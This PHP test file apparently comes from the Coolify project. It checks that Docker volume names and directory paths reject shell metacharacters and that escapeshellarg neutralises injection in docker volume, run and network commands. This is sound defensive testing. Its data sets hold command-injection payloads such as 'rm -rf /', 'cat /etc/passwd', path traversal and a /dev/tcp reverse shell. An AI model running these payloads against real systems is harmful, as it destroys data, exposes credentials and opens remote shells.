<?php

/**
 * Persistent Volume Security Tests
 *
 * Tests to ensure persistent volume names are validated against command injection
 * and that shell commands properly escape volume names.
 *
 * Related Files:
 *  - app/Models/LocalPersistentVolume.php
 *  - app/Support/ValidationPatterns.php
 *  - app/Livewire/Project/Service/Storage.php
 *  - app/Actions/Service/DeleteService.php
 */

use App\Support\ValidationPatterns;

// --- Volume Name Pattern Tests ---

it('accepts valid Docker volume names', function (string $name) {
    expect(preg_match(ValidationPatterns::VOLUME_NAME_PATTERN, $name))->toBe(1);
})->with([
    'simple name' => 'myvolume',
    'with hyphens' => 'my-volume',
    'with underscores' => 'my_volume',
    'with dots' => 'my.volume',
    'with uuid prefix' => 'abc123-postgres-data',
    'numeric start' => '1volume',
    'complex name' => 'app123-my_service.data-v2',
]);

it('rejects volume names with shell metacharacters', function (string $name) {
    expect(preg_match(ValidationPatterns::VOLUME_NAME_PATTERN, $name))->toBe(0);
})->with([
    'semicolon injection' => 'vol; rm -rf /',
    'pipe injection' => 'vol | cat /etc/passwd',
    'ampersand injection' => 'vol && whoami',
    'backtick injection' => 'vol`id`',
    'dollar command substitution' => 'vol$(whoami)',
    'redirect injection' => 'vol > /tmp/evil',
    'space in name' => 'my volume',
    'slash in name' => 'my/volume',
    'newline injection' => "vol\nwhoami",
    'starts with hyphen' => '-volume',
    'starts with dot' => '.volume',
]);

// --- escapeshellarg Defense Tests ---

it('escapeshellarg neutralizes injection in docker volume rm command', function (string $maliciousName) {
    $command = 'docker volume rm -f '.escapeshellarg($maliciousName);

    // The command should contain the name as a single quoted argument,
    // preventing shell interpretation of metacharacters
    expect($command)->not->toContain('; ')
        ->not->toContain('| ')
        ->not->toContain('&& ')
        ->not->toContain('`')
        ->toStartWith('docker volume rm -f ');
})->with([
    'semicolon' => 'vol; rm -rf /',
    'pipe' => 'vol | cat /etc/passwd',
    'ampersand' => 'vol && whoami',
    'backtick' => 'vol`id`',
    'command substitution' => 'vol$(whoami)',
    'reverse shell' => 'vol$(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)',
]);

// --- volumeNameRules Tests ---

it('generates volumeNameRules with correct defaults', function () {
    $rules = ValidationPatterns::volumeNameRules();

    expect($rules)->toContain('required')
        ->toContain('string')
        ->toContain('max:255')
        ->toContain('regex:'.ValidationPatterns::VOLUME_NAME_PATTERN);
});

it('generates nullable volumeNameRules when not required', function () {
    $rules = ValidationPatterns::volumeNameRules(required: false);

    expect($rules)->toContain('nullable')
        ->not->toContain('required');
});

it('generates correct volumeNameMessages', function () {
    $messages = ValidationPatterns::volumeNameMessages();

    expect($messages)->toHaveKey('name.regex');
});

it('generates volumeNameMessages with custom field name', function () {
    $messages = ValidationPatterns::volumeNameMessages('volume_name');

    expect($messages)->toHaveKey('volume_name.regex');
});

// --- escapeshellarg Defense Tests for docker volume create ---

it('escapeshellarg neutralizes injection in docker volume create command', function (string $maliciousName) {
    $escaped = escapeshellarg($maliciousName);
    $command = "docker volume create {$escaped}";

    expect($command)->toStartWith('docker volume create ')
        ->and($escaped)->toStartWith("'")
        ->and($escaped)->toEndWith("'");
})->with([
    'semicolon' => 'vol; rm -rf /',
    'pipe' => 'vol | cat /etc/passwd',
    'ampersand' => 'vol && whoami',
    'backtick' => 'vol`id`',
    'command substitution' => 'vol$(whoami)',
]);

// --- escapeshellarg Defense Tests for docker run -v ---

it('escapeshellarg neutralizes injection in docker run -v command', function (string $maliciousName) {
    $escaped = escapeshellarg($maliciousName);
    $command = "docker run --rm -v {$escaped}:/source -v {$escaped}:/target alpine sh -c 'cp -a /source/. /target/'";

    expect($command)->toContain('docker run --rm -v ')
        ->and($escaped)->toStartWith("'")
        ->and($escaped)->toEndWith("'");
})->with([
    'semicolon' => 'vol; rm -rf /',
    'pipe' => 'vol | cat /etc/passwd',
    'command substitution' => 'vol$(whoami)',
]);

// --- escapeshellarg Defense Tests for docker network commands ---

it('escapeshellarg neutralizes injection in docker network disconnect command', function (string $maliciousName) {
    $escaped = escapeshellarg($maliciousName);
    $command = "docker network disconnect {$escaped} coolify-proxy";

    expect($command)->toStartWith('docker network disconnect ')
        ->and($escaped)->toStartWith("'")
        ->and($escaped)->toEndWith("'");
})->with([
    'semicolon' => 'net; rm -rf /',
    'pipe' => 'net | cat /etc/passwd',
    'command substitution' => 'net$(whoami)',
]);

it('escapeshellarg neutralizes injection in docker network rm command', function (string $maliciousName) {
    $escaped = escapeshellarg($maliciousName);
    $command = "docker network rm {$escaped}";

    expect($command)->toStartWith('docker network rm ')
        ->and($escaped)->toStartWith("'")
        ->and($escaped)->toEndWith("'");
})->with([
    'semicolon' => 'net; rm -rf /',
    'pipe' => 'net | cat /etc/passwd',
    'command substitution' => 'net$(whoami)',
]);

// --- DIRECTORY_PATH_PATTERN Tests ---

it('accepts valid directory paths', function (string $path) {
    expect(preg_match(ValidationPatterns::DIRECTORY_PATH_PATTERN, $path))->toBe(1);
})->with([
    'root' => '/',
    'simple path' => '/data',
    'nested path' => '/data/coolify/volumes',
    'with dots' => '/data/my.app/storage',
    'with hyphens' => '/data/my-app/storage',
    'with underscores' => '/data/my_app/storage',
]);

it('rejects directory paths with shell metacharacters', function (string $path) {
    expect(preg_match(ValidationPatterns::DIRECTORY_PATH_PATTERN, $path))->toBe(0);
})->with([
    'semicolon injection' => '/etc; rm -rf /',
    'pipe injection' => '/etc | cat /etc/passwd',
    'command substitution' => '/etc$(whoami)',
    'backtick injection' => '/etc`id`',
    'space injection' => '/etc /tmp',
    'relative traversal' => '../../../etc/passwd',
    'no leading slash' => 'etc/passwd',
]);
